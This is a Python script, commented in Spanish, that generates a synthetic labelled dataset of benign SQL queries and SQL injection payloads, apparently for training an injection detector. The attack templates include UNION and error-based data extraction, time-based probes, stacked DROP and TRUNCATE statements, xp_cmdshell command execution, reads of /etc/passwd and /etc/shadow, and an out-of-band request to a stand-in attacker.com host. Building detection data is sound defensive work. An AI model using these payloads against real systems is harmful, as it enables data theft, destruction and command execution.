"""
Genera sqli.csv sintético con Sentence + Label (0=normal, 1=ataque SQLi).
Guardado en UTF-16 para coincidir con el formato esperado por load_sqli().
"""
import random
import pandas as pd

random.seed(2026)

# ── Tablas / columnas / valores comunes ────────────────────────────────────
TABLES   = ["users", "products", "orders", "customers", "accounts",
            "sessions", "logs", "posts", "comments", "payments"]
COLS     = ["id", "username", "email", "password", "name",
            "price", "status", "created_at", "token", "role"]
NAMES    = ["alice", "bob", "charlie", "diana", "eve",
            "frank", "grace", "henry", "iris", "jack"]
STATUSES = ["active", "inactive", "pending", "banned", "verified"]

def rand_int(lo=1, hi=9999):
    return random.randint(lo, hi)

def rand_name():
    return random.choice(NAMES)

def rand_table():
    return random.choice(TABLES)

def rand_col():
    return random.choice(COLS)

# ── Plantillas de consultas NORMALES ──────────────────────────────────────
def gen_normal():
    t = rand_table()
    c = rand_col()
    templates = [
        # SELECT
        f"SELECT * FROM {t} WHERE id = {rand_int()}",
        f"SELECT {c}, username FROM {t} WHERE status = '{random.choice(STATUSES)}'",
        f"SELECT COUNT(*) FROM {t}",
        f"SELECT id, email FROM {t} WHERE username = '{rand_name()}'",
        f"SELECT * FROM {t} ORDER BY created_at DESC LIMIT {random.randint(5,50)}",
        f"SELECT {c} FROM {t} WHERE id BETWEEN {rand_int(1,100)} AND {rand_int(101,500)}",
        f"SELECT t1.id, t2.name FROM {t} t1 JOIN orders t2 ON t1.id = t2.user_id",
        f"SELECT DISTINCT {c} FROM {t} WHERE role = 'admin'",
        f"SELECT * FROM {t} WHERE email LIKE '%@example.com'",
        f"SELECT {c} FROM {t} LIMIT {random.randint(1,20)} OFFSET {random.randint(0,50)}",
        # INSERT
        f"INSERT INTO {t} (username, email) VALUES ('{rand_name()}', '{rand_name()}@mail.com')",
        f"INSERT INTO {t} (name, status) VALUES ('{rand_name()}', '{random.choice(STATUSES)}')",
        f"INSERT INTO products (name, price) VALUES ('Widget', {round(random.uniform(1,999),2)})",
        # UPDATE
        f"UPDATE {t} SET status = 'active' WHERE id = {rand_int()}",
        f"UPDATE {t} SET email = '{rand_name()}@mail.com' WHERE username = '{rand_name()}'",
        f"UPDATE orders SET status = 'shipped' WHERE created_at < '2025-01-01'",
        # DELETE
        f"DELETE FROM sessions WHERE token = 'abc{rand_int()}xyz'",
        f"DELETE FROM logs WHERE created_at < '2024-01-01'",
        # DDL-like but benign
        f"SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'",
        f"SELECT column_name FROM information_schema.columns WHERE table_name = '{t}'",
    ]
    return random.choice(templates)

# ── Patrones de ataque SQLi ────────────────────────────────────────────────
KEYWORDS_OR  = ["OR", "or", "oR", "Or", "||"]
KEYWORDS_AND = ["AND", "and", "AnD", "aNd", "&&"]
COMMENTS     = ["--", "#", "/*", "-- -", "--+"]
COLS_UNION   = ["username", "password", "email", "token", "role", "id"]
SLEEP_FN     = ["SLEEP", "pg_sleep", "waitfor delay"]
CHAR_SETS    = list("abcdefghijklmnopqrstuvwxyz0123456789")

def gen_attack():
    t   = rand_table()
    c   = rand_col()
    n   = rand_int()
    n2  = rand_int()
    ch  = random.choice(CHAR_SETS)
    cmt = random.choice(COMMENTS)
    kw  = random.choice(KEYWORDS_OR)
    sp  = random.randint(1, 9)
    pos = random.randint(1, 8)
    lim = random.randint(1, 5)
    hex_val = hex(random.randint(0x41, 0x7A))

    attack_type = random.randint(0, 7)

    if attack_type == 0:  # Classic OR/AND
        v1 = random.choice(["1", "'a'", str(rand_int()), "true"])
        v2 = random.choice(["1", "'a'", str(rand_int()), "true"])
        return f"' {kw} {v1}={v2} {cmt}"

    elif attack_type == 1:  # UNION-based
        cols = random.randint(2, 5)
        null_list = ",".join(random.choice([str(i+1), "NULL", f"'{rand_name()}'"])
                              for i in range(cols))
        src = random.choice([
            f"{t}",
            "information_schema.tables",
            "information_schema.columns",
            "sys.objects",
            "mysql.user",
        ])
        return f"' UNION SELECT {null_list} FROM {src} {cmt}"

    elif attack_type == 2:  # Error-based
        choices = [
            f"' AND EXTRACTVALUE({rand_int(1,9)}, CONCAT(0x7e,(SELECT {random.choice(COLS_UNION)} FROM {t} LIMIT {lim}))) {cmt}",
            f"1 AND 1=CONVERT(int,(SELECT TOP {lim} {c} FROM {t})) {cmt}",
            f"' AND ROW({n},{n2}) > (SELECT COUNT(*),CONCAT((SELECT {c} FROM {t} LIMIT {lim}),0x3a,FLOOR(RAND()*2)) FROM information_schema.tables GROUP BY 2) {cmt}",
            f"' AND GTID_SUBSET(CONCAT(0x7e,(SELECT {c} FROM {t} LIMIT {lim})),{n}) {cmt}",
        ]
        return random.choice(choices)

    elif attack_type == 3:  # Blind boolean
        choices = [
            f"' {random.choice(KEYWORDS_AND)} SUBSTRING(({random.choice(COLS_UNION)}),{pos},1)='{ch}' {cmt}",
            f"' {random.choice(KEYWORDS_AND)} LENGTH({c})>{random.randint(3,20)} {cmt}",
            f"' {random.choice(KEYWORDS_AND)} (SELECT COUNT(*) FROM {t})>{n} {cmt}",
            f"' {random.choice(KEYWORDS_AND)} ASCII(MID((SELECT {c} FROM {t} LIMIT {lim}),{pos},1))>{random.randint(32,127)} {cmt}",
            f"1 {random.choice(KEYWORDS_AND)} {random.randint(1,9)}={random.randint(1,9)} {cmt}",
        ]
        return random.choice(choices)

    elif attack_type == 4:  # Time-based
        fn = random.choice(SLEEP_FN)
        choices = [
            f"'; {fn}({sp}) {cmt}",
            f"' {random.choice(KEYWORDS_AND)} IF(1=1,{fn}({sp}),0) {cmt}",
            f"1; SELECT {fn}({sp}) {cmt}",
            f"' {random.choice(KEYWORDS_AND)} {fn}({sp}) {cmt}",
            f"'; WAITFOR DELAY '0:0:{sp}' {cmt}",
        ]
        return random.choice(choices)

    elif attack_type == 5:  # Stacked / DDL
        choices = [
            f"'; DROP TABLE {t} {cmt}",
            f"'; INSERT INTO {t} ({c}) VALUES ('{rand_name()}') {cmt}",
            f"1; UPDATE {t} SET {c}='{rand_name()}' WHERE id={n} {cmt}",
            f"'; EXEC xp_cmdshell('{random.choice(['whoami','dir','ls','id'])}') {cmt}",
            f"'; CREATE TABLE tmp{n}(a varchar(100)) {cmt}",
            f"'; TRUNCATE TABLE {t} {cmt}",
        ]
        return random.choice(choices)

    elif attack_type == 6:  # Out-of-band / file
        choices = [
            f"LOAD_FILE('/etc/{random.choice(['passwd','shadow','hosts'])}') {cmt}",
            f"'; SELECT {c} INTO OUTFILE '/tmp/{rand_name()}.txt' FROM {t} {cmt}",
            f"' {random.choice(KEYWORDS_AND)} 1=UTL_HTTP.REQUEST('http://{rand_name()}.attacker.com/') {cmt}",
            f"'; EXEC sp_addlogin '{rand_name()}','{rand_name()}' {cmt}",
            f"{hex_val}=0x41 {kw} 1=1 {cmt}",
        ]
        return random.choice(choices)

    else:  # Obfuscated
        choices = [
            f"%27 {kw} %27{random.randint(1,9)}%27=%27{random.randint(1,9)}",
            f"' /*!UNION*/ /*!SELECT*/ {','.join(str(i) for i in range(1,random.randint(2,5)))} {cmt}",
            f"'/**/{kw}/**/1=1{cmt}",
            f"' {kw.upper()} {n}={n} {cmt}",
            f"'; -- comment\nSELECT {c} FROM {t} {cmt}",
            f"' {kw} 0x{random.randint(0x41,0x7A):02x}=0x{random.randint(0x41,0x7A):02x} {cmt}",
        ]
        return random.choice(choices)


# ── Generar dataset ────────────────────────────────────────────────────────
N_NORMAL = 4200
N_ATTACK = 3800
N_TOTAL  = N_NORMAL + N_ATTACK

sentences = [gen_normal() for _ in range(N_NORMAL)] + \
            [gen_attack() for _ in range(N_ATTACK)]
labels    = [0] * N_NORMAL + [1] * N_ATTACK

# Shuffle
combined = list(zip(sentences, labels))
random.shuffle(combined)
sentences, labels = zip(*combined)

df = pd.DataFrame({"Sentence": sentences, "Label": labels})

# Deduplicate
df = df.drop_duplicates(subset=["Sentence"]).reset_index(drop=True)

out_path = r"C:\Users\jcond\OneDrive\Escritorio\prubas AthenAI\training\raw\sqli.csv"
df.to_csv(out_path, index=False, encoding="utf-16")

print(f"sqli.csv generado: {len(df)} filas")
print(f"  Normal (0): {(df['Label']==0).sum()}")
print(f"  Ataque (1): {(df['Label']==1).sum()}")
print(f"  Guardado en: {out_path}")
